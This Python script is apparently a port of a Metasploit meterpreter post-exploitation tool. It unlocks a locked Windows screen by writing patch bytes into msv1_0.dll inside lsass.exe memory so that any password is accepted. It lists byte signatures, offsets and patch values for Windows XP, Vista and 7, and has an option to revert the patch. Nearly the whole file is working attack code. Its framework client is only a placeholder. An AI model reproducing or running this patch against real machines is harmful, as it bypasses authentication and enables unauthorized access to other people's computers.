#!/usr/bin/env python3
##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##

"""
Script to unlock a windows screen by L4teral <l4teral [4t] gmail com>
Needs system privileges to run and known signatures for the target system.
This script patches msv1_0.dll loaded by lsass.exe

Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16
"""

import argparse
import re
import sys

# NOTE: This would need actual framework initialization in a real implementation
# Placeholder for Meterpreter client
client = None

PROCESS_ALL_ACCESS = 0x1F0FFF

targets = [
    {"sig": "8bff558bec83ec50a1", "sigoffset": 0x9927, "orig_code": "32c0", "patch": "b001", "patchoffset": 0x99cc, "os": re.compile(r"Windows XP.*Service Pack 2")},
    {"sig": "8bff558bec83ec50a1", "sigoffset": 0x981b, "orig_code": "32c0", "patch": "b001", "patchoffset": 0x98c0, "os": re.compile(r"Windows XP.*Service Pack 3")},
    {"sig": "8bff558bec81ec88000000a1", "sigoffset": 0xb76a, "orig_code": "32c0", "patch": "b001", "patchoffset": 0xb827, "os": re.compile(r"Windows Vista")},
    {"sig": "8bff558bec81ec88000000a1", "sigoffset": 0xb391, "orig_code": "32c0", "patch": "b001", "patchoffset": 0xb44e, "os": re.compile(r"Windows Vista")},
    {"sig": "8bff558bec81ec88000000a1", "sigoffset": 0xacf6, "orig_code": "32c0", "patch": "b001", "patchoffset": 0xadb3, "os": re.compile(r"Windows Vista")},
    {"sig": "8bff558bec81ec88000000a1", "sigoffset": 0xe881, "orig_code": "32c0", "patch": "b001", "patchoffset": 0xe93e, "os": re.compile(r"Windows 7")},
]


def unsupported():
    """Check for proper Meterpreter Platform"""
    print("[-] This version of Meterpreter is not supported with this Script!")
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="Windows Screen Unlock Script",
        add_help=False
    )
    parser.add_argument(
        "-r", "--revert", action="store_true",
        help="revert the patch (enable screen locking again)"
    )
    parser.add_argument(
        "-h", "--help", action="store_true",
        help="Help menu."
    )
    
    args = parser.parse_args()
    
    if args.help:
        print("")
        print("USAGE:   run screen_unlock [-r]")
        print("  -r    revert the patch (enable screen locking again)")
        print("  -h    Help menu.")
        sys.exit(0)
    
    # Check for proper Meterpreter Platform
    if client is None or client.platform != 'windows':
        unsupported()
    
    os = client.sys.config.sysinfo['OS']
    
    for t in targets:
        if t["os"].search(os):
            target = t
            print(f"[*] OS '{os}' found in known targets")
            pid = client.sys.process["lsass.exe"]
            p = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
            dllbase = p.image["msv1_0.dll"]
            
            sig = p.memory.read(dllbase + target["sigoffset"], len(target["sig"]) // 2).hex()
            if sig != target["sig"]:
                print("[-] found signature does not match")
                continue
            
            old_code = p.memory.read(dllbase + target["patchoffset"], len(target["orig_code"]) // 2).hex()
            if not ((old_code == target["orig_code"] and not args.revert) or (old_code == target["patch"] and args.revert)):
                print("[-] found code does not match")
                continue
            
            print("[*] patching...")
            new_code = target["orig_code"] if args.revert else target["patch"]
            p.memory.write(dllbase + target["patchoffset"], bytes.fromhex(new_code))
            
            written_code = p.memory.read(dllbase + target["patchoffset"], len(target["patch"]) // 2).hex()
            if ((written_code == target["patch"] and not args.revert) or (written_code == target["orig_code"] and args.revert)):
                print("[*] done!")
                sys.exit(0)
            else:
                print("[-] failed!")
                continue
    
    print("[*] no working target found")


if __name__ == "__main__":
    main()
